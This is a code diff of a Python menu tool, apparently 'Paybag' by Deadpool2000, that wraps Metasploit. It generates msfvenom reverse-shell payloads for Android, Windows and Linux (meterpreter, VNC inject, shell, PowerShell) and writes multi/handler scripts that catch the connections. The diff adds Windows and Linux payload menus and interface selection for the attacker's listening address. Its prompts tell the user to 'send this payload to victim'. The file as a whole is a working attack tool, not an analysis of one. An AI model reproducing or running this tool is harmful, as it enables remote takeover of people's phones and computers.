@@ -1,6 +1,7 @@
 import os
 import random
 import sys
+from prettytable import PrettyTable
 
 try:
     os.system('clear')
@@ -10,6 +11,8 @@ try:
     CY='\033[96m'
     W='\033[97m'
     B='\033[95m'
+    global osname
+    
 
     def start():
         print(CY+"""
@@ -20,44 +23,76 @@ try:
 /_/    \__,_/\__, /_.___/\__,_/\__, /  
             /____/            /____/  
 """+Y+"""
-           [--> v1.0 <--]"""+G+"""
+           [--"""+R+""">"""+Y+""" v1.1 """+R+"""<"""+Y+"""--]"""+G+"""
 
 >> Payload generator for Metasploit <<"""+CY+"""
       ---------------------------"""+B+"""
         Code By -> Deadpool2000""")
         
     def main():
-        print(R+"""************************************************"""+CY+"""\n
+        print(R+"""\n************************************************"""+CY+"""\n
 >>> Main menu"""+Y+"""
 
 1) Create a payload
-2) Start handler
+2) Start listner
 3) Launch Metasploit
 4) Exit\n""")
 
     def osi():
-        print(R+"""
+        print(R+"""\n
 ************************************************"""+Y+"""
             
 >>> Select operating system to create payload\n"""+CY+"""
 1) Android
 2) Windows
 3) Linux
-4) Mac OS
 
 99) Back to main menu\n""")
 
     def lst():
-        print(R+"""
+        print(R+"""\n
 ************************************************"""+Y+"""
 
->>> Select operating system to create handler\n"""+CY+"""
+>>> Select operating system to create listner\n"""+CY+"""
 1) Android
 2) Windows
 3) Linux
-4) Mac OS
 
 99) Back to main menu\n""")
+
+
+    def payld():
+        print(R+"""
+************************************************"""+Y+"""
+
+>>> Select payload\n"""+CY+"""
+1) windows/meterpreter/reverse_tcp
+2) windows/x64/meterpreter/reverse_tcp (For 64-bit)
+3) windows/vncinject/reverse_tcp
+4) windows/x64/vncinject/reverse_tcp (For 64-bit)
+5) windows/shell/reverse_tcp 
+6) windows/x64/shell/reverse_tcp (For 64-bit)
+7) windows/powershell_reverse_tcp 
+8) windows/x64/powershell_reverse_tcp (For 64-bit)
+
+99) Back to main menu\n""")
+
+
+    def linux_payload():
+        print(R+"""
+************************************************"""+Y+"""
+
+>>> Select payload\n"""+CY+"""
+1) linux/x86/meterpreter/reverse_tcp
+2) linux/x64/meterpreter/reverse_tcp (For 64-bit)
+3) linux/x86/shell/reverse_tcp
+4) linux/x64/shell/reverse_tcp (For 64-bit)
+
+99) Back to main menu\n""")
+
+
+    def arch1():
+        print(CY+"""Select Architecture -"""+R+"""1)"""+Y+""" x86"""+R+""" 2)"""+Y+""" x64""")
 
     def checkver():
         if sys.version_info[0] < 3:
@@ -65,7 +100,6 @@ try:
             exit(0)
     
     def mk():
-        
         if os.path.exists("payload")==False:
             os.system("mkdir payload")
             
@@ -85,6 +119,71 @@ try:
 ************************************************\n************************************************\n"""
 +Y+"\nmsfconsole not found ! Please install Meatsploit-Framework properly and try again :( \n"+W)
                 exit(0)
+
+                
+    def cfile(lh,lp,ply):
+        f=open("msh.rc","w+")
+        l1="use exploit/multi/handler"
+        l2="set PAYLOAD "+str(ply)
+        l3="set LHOST "+str(lh)
+        l4="set LPORT "+str(lp)
+        l5="set ExitOnSession false"
+        l6="exploit -j -z"
+        f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
+        f.close()
+        return
+
+    
+    def crplyd(lh,lp,ply,osname,ext):
+        print(B+"\nGenerating payload..........\n")
+        a=random.randint(1,99)
+        st1=str(osname)+str(a)+str(ext)
+        st="msfvenom -p "+str(ply)+" lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+str(st1)
+        os.system(st)
+        print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
+        print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
+        return
+
+
+    def table():
+        global ipd
+        global adr
+        tb=PrettyTable()
+        tb.field_names=["No.","Interface","Address"]
+        inte=os.listdir('/sys/class/net/')
+        i=j=k=0
+        adr=[]
+        for i in range(len(inte)):
+            cout=inte[i]
+            st="ifconfig "+str(cout)+" | grep 'inet ' | cut -c 13-26"
+            opt=os.popen(st)
+            ipd=opt.read()
+            cr=['n','e','t','m','a','s','k']
+            for l in cr:
+                ipd=ipd.replace(l,'')
+            ipd=ipd.strip()
+            adr.append(ipd)
+            tb.add_row([k,inte[i],adr[j]])
+            i+=1
+            j+=1
+            k+=1
+        print(Y+"\n>>> Select LHOST from list\n"+W)
+        print(tb)
+        try:
+            sc=int(input(G+"\nSelect your choice >>"+W+" "))
+            try:
+                ipd=adr[sc]
+                if ipd=="":
+                    print(R+"\nNull address found!Select another address!")
+                    table()
+                else:
+                    print(CY+"\nSelected LHOST:"+W,ipd)
+            except IndexError:
+                print(R+"\nInvalid Choice! Please try again!")
+                table()
+        except ValueError:
+            print(R+"\nInvalid Choice! Please try again!")
+            table()
                 
     def sel():
         try:
@@ -93,54 +192,138 @@ try:
                 def sel1():
                     try:
                         ch=int(input(G+"Select your choice >>"+W+" "))
-                        if ch==1:
+
+                        # Android
+                        
+                        if ch==1: 
                             lh=input(CY+"\nEnter LHOST:"+W+" ")
                             lp=int(input(CY+"Enter LPORT:"+W+" "))
-                            print(B+"\nGenerating payload..........\n")
-                            a=random.randint(1,99)
-                            st1="android_"+str(a)+".apk"
-                            st="msfvenom -p android/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
-                            os.system(st)
-                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
-                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
+                            ply="android/meterpreter/reverse_tcp"
+                            osname="android_"
+                            ext=".apk"
+                            crplyd(lh,lp,ply,osname,ext)
                             osi()
                             sel1()
-                        elif ch==2:
-                            lh=input(CY+"\nEnter LHOST:"+W+" ")
-                            lp=int(input(CY+"Enter LPORT:"+W+" "))
-                            print(B+"\nGenerating payload..........\n")
-                            a=random.randint(1,99)
-                            st1="win_"+str(a)+".exe"
-                            st="msfvenom -p windows/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
-                            os.system(st)
-                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
-                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
+                        
+                        # Windows    
+
+                        elif ch==2: 
+                            try:
+                                payld()
+                                cc=int(input(G+"Select your choice >>"+W+" "))
+                                if cc==1:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/meterpreter/reverse_tcp"
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==2:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/x64/meterpreter/reverse_tcp"
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==3:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/vncinject/reverse_tcp"
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==4:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/x64/vncinject/reverse_tcp"
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==5:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/shell/reverse_tcp"
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==6:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/x64/shell/reverse_tcp"
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==7:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/powershell_reverse_tcp "
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==8:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="windows/x64/powershell_reverse_tcp "
+                                    osname="win_"
+                                    ext=".exe"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                else:
+                                    print(R+"\nInvalid Choice! Please try again!")
+                                    osi()
+                                    sel1()
+                            except ValueError:
+                                print(R+"\nInvalid Choice! Please try again!")
+                                osi()
+                                sel1()
                             osi()
                             sel1()
-                        elif ch==3:
-                            lh=input(CY+"\nEnter LHOST:"+W+" ")
-                            lp=int(input(CY+"Enter LPORT:"+W+" "))
-                            print(B+"\nGenerating payload..........\n")
-                            a=random.randint(1,99)
-                            st1="linux_"+str(a)+".elf"
-                            st="msfvenom -p linux/x86/meterpreter/reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
-                            os.system(st)
-                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
-                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
+
+                        # Linux
+                        
+                        elif ch==3: 
+                            try:
+                                linux_payload()
+                                cc=int(input(G+"Select your choice >>"+W+" "))
+                                if cc==1:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="linux/x86/meterpreter/reverse_tcp"
+                                    osname="linux_"
+                                    ext=".elf"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==2:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="linux/x64/meterpreter/reverse_tcp"
+                                    osname="linux_"
+                                    ext=".elf"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==3:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="linux/x86/shell/reverse_tcp"
+                                    osname="linux_"
+                                    ext=".elf"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                elif cc==4:
+                                    lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                    lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                    ply="linux/x64/shell/reverse_tcp"
+                                    osname="linux_"
+                                    ext=".elf"
+                                    crplyd(lh,lp,ply,osname,ext)
+                                else:
+                                    print(R+"\nInvalid Choice! Please try again!")
+                                    osi()
+                                    sel1()
+                                
+                            except ValueError:
+                                print(R+"\nInvalid Choice! Please try again!")
+                                osi()
+                                sel1()
                             osi()
                             sel1()
-                        elif ch==4:
-                            lh=input(CY+"\nEnter LHOST:"+W+" ")
-                            lp=int(input(CY+"Enter LPORT:"+W+" "))
-                            print(B+"\nGenerating payload..........\n")
-                            a=random.randint(1,99)
-                            st1="macos_"+str(a)+".macho"
-                            st="msfvenom -p osx/x86/shell_reverse_tcp lhost="+str(lh)+" lport="+str(lp)+" R > payload/"+st1
-                            os.system(st)
-                            print(R+"\n>>>"+G+" Payload saved as ("+Y+st1+G+") in 'payload' folder"+R+" <<<\n")
-                            print(CY+"Now send this payload to victim. Then start 'handler' from main menu\n")
-                            osi()
-                            sel1()
+
                         elif ch==99:
                             os.system('clear')
                             start()
@@ -162,22 +345,13 @@ try:
                         if ch==1:
                             pr=os.path.isfile("msh.rc")
                             if pr:
-                                try:
-                                    os.remove('msh.rc')
-                                except FileNotFoundError:
-                                    print()
-                            else:                
-                                lh=input(CY+"\nEnter LHOST:"+W+" ")
+                                check()
+                            else:
+                                table()
+                                lh=ipd
                                 lp=int(input(CY+"Enter LPORT:"+W+" "))
-                                f=open("msh.rc","w+")
-                                l1="use exploit/multi/handler"
-                                l2="set PAYLOAD android/meterpreter/reverse_tcp"
-                                l3="set LHOST "+str(lh)
-                                l4="set LPORT "+str(lp)
-                                l5="set ExitOnSession false"
-                                l6="exploit -j -z"
-                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
-                                f.close()
+                                ply="android/meterpreter/reverse_tcp"
+                                cfile(lh,lp,ply)
                             os.system('clear')
                             print(Y+"\nStarting handler...............\n"+W)
                             os.system("msfconsole -r msh.rc")
@@ -186,97 +360,132 @@ try:
                             lst()
                             sel2()
                         elif ch==2:
-                            pr=os.path.isfile('msh.rc')
-                            if pr:
-                                try:
-                                    os.remove('msh.rc')
-                                except FileNotFoundError:
-                                    print()
-                            else:                
-                                lh=input(CY+"\nEnter LHOST:"+W+" ")
-                                lp=int(input(CY+"Enter LPORT:"+W+" "))
-                                f=open("msh.rc","w+")
-                                l1="use exploit/multi/handler"
-                                l2="set PAYLOAD windows/meterpreter/reverse_tcp"
-                                l3="set LHOST "+str(lh)
-                                l4="set LPORT "+str(lp)
-                                l5="set ExitOnSession false"
-                                l6="exploit -j -z"
-                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
-                                f.close()
-                            os.system('clear')
-                            print(Y+"\nStarting handler...............\n"+W)
-                            os.system("msfconsole -r msh.rc")
-                            os.remove('msh.rc')
-                            os.system('clear')
-                            lst()
-                            sel2()
-                        elif ch==3:
-                            pr=os.path.isfile('msh.rc')
-                            if pr:
-                                try:
-                                    os.remove('msh.rc')
-                                except FileNotFoundError:
-                                    print()
-                            else:                
-                                lh=input(CY+"\nEnter LHOST:"+W+" ")
-                                lp=int(input(CY+"Enter LPORT:"+W+" "))
-                                f=open("msh.rc","w+")
-                                l1="use exploit/multi/handler"
-                                l2="set PAYLOAD linux/x86/meterpreter/reverse_tcp"
-                                l3="set LHOST "+str(lh)
-                                l4="set LPORT "+str(lp)
-                                l5="set ExitOnSession false"
-                                l6="exploit -j -z"
-                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
-                                f.close()
-                            os.system('clear')
-                            print(Y+"\nStarting handler...............\n"+W)
-                            os.system("msfconsole -r msh.rc")
-                            os.remove('msh.rc')
-                            os.system('clear')
-                            lst()
-                            sel2()
-                        elif ch==4:
-                            pr=os.path.isfile('msh.rc')
-                            if pr:
-                                try:
-                                    os.remove('msh.rc')
-                                except FileNotFoundError:
-                                    print()
-                            else:                
-                                lh=input(CY+"\nEnter LHOST:"+W+" ")
-                                lp=int(input(CY+"Enter LPORT:"+W+" "))
-                                f=open("msh.rc","w+")
-                                l1="use exploit/multi/handler"
-                                l2="set PAYLOAD osx/x86/shell_reverse_tcp"
-                                l3="set LHOST "+str(lh)
-                                l4="set LPORT "+str(lp)
-                                l5="set ExitOnSession false"
-                                l6="exploit -j -z"
-                                f.write("%s\n%s\n%s\n%s\n%s\n%s\n" %(l1,l2,l3,l4,l5,l6))
-                                f.close()
-                            os.system('clear')
-                            print(Y+"\nStarting handler...............\n"+W)
-                            os.system("msfconsole -r msh.rc")
-                            os.remove('msh.rc')
-                            os.system('clear')
-                            lst()
-                            sel2()
-                        elif ch==99:
                             try:
+                                pr=os.path.isfile('msh.rc')
+                                if pr:
+                                    check()
+                                else:
+                                    payld()
+                                    ch=int(input(G+"Select your choice >>"+W+" "))
+                                    if ch==1:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/meterpreter/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==2:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/x64/meterpreter/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==3:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/vncinject/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==4:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/x64/vncinject/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==5:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/shell/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==6:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/x64/shell/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==7:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/powershell_reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==8:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="windows/x64/powershell_reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    else:
+                                        print(R+"\nInvalid choice! Please try again\n")
+                                        lst()
+                                        sel2()
+                                os.system('clear')
+                                print(Y+"\nStarting handler...............\n"+W)
+                                os.system("msfconsole -r msh.rc")
                                 os.remove('msh.rc')
-                            except FileNotFoundError:
-                                print()
+                                os.system('clear')
+                                lst()
+                                sel2()
+                            except ValueError:
+                                print(R+"\nInvalid choice! Please try again\n")
+                                lst()
+                                sel2()
+                        elif ch==3:
+                            try:
+                                pr=os.path.isfile('msh.rc')
+                                if pr:
+                                    check()
+                                else:
+                                    linux_payload()
+                                    ch=int(input(G+"Select your choice >>"+W+" "))
+                                    if ch==1:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="linux/x86/meterpreter/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==2:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="linux/x64/meterpreter/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==3:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="linux/x86/shell/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    elif ch==4:
+                                        table()
+                                        lh=ipd
+                                        lp=int(input(CY+"Enter LPORT:"+W+" "))
+                                        ply="linux/x64/shell/reverse_tcp"
+                                        cfile(lh,lp,ply)
+                                    else:
+                                        print(R+"\nInvalid choice! Please try again\n")
+                                        lst()
+                                        sel2()
+                                os.system('clear')
+                                print(Y+"\nStarting handler...............\n"+W)
+                                os.system("msfconsole -r msh.rc")
+                                os.remove('msh.rc')
+                                os.system('clear')
+                                lst()
+                                sel2()
+                            except ValueError:
+                                print(R+"\nInvalid choice! Please try again\n")
+                                lst()
+                                sel2()
+
+                        elif ch==99:
+                            check()
                             os.system('clear')
                             start()
                             main()
                             sel()
                         else:
-                            try:
-                                os.remove('msh.rc')
-                            except FileNotFoundError:
-                                print()
+                            check()
                             print(R+"\nInvalid choice! Please try again\n")
                             lst()
                             sel2()
@@ -285,6 +494,7 @@ try:
                         sel2()
                 lst()
                 sel2()
+                
             elif c==3:
                 os.system('clear')
                 print(Y+"\n>>> Launching msfconsole..................\n\n"+W)
@@ -293,21 +503,16 @@ try:
                 start()
                 main()
                 sel()
+                
             elif c==4:
-                try:
-                    os.remove('msh.rc')
-                except FileNotFoundError:
-                    print("")
+                check()
                 print(R+"************************************************")
                 print(Y+"\nExit.........! Have a nice day :) ")
                 print(R+"\n------------"+CY+" Code by >> "+G+" Deadpool2000"+R+" ----------------------"+W)
                 print(R+"------------"+CY+" Youtube >> "+G+" https://bit.ly/2HnPZd2"+R+" ------------\n"+W)
 
             else:
-                try:
-                    os.remove('msh.rc')
-                except FileNotFoundError:
-                    print("")
+                check()
                 print(R+"\nInvalid choice ! Please try again :(\n")
                 main()                
                 sel()
@@ -324,7 +529,15 @@ try:
                 if p=="y":
                     os.system("apt install unstable-repo -y")
                     os.system("apt update && apt install metasploit -y")
-                    print("\n")
+                    os.system('clear')
+                    checkver()
+                    start()
+                    mk()
+                    check()
+                    check2()
+                    ch3()
+                    main()                
+                    sel()
                 elif p=="n":
                     print(Y+"\nExit.........! Have a nice day :) ")
                     print(R+"\n------------"+CY+" Code by >>"+G+" Deadpool2000"+R+" ----------------------"+W)
@@ -342,11 +555,9 @@ try:
     ch3()
     main()                
     sel()
+    
 except KeyboardInterrupt:
-    try:
-        os.remove('msh.rc')
-    except FileNotFoundError:
-        print()
+    check()
     print(CY+"""\n
 ************************************************"""+G+
 "\n\n>>> "+R+"Interrupted!"+Y+" Exiting.........\n"+W)
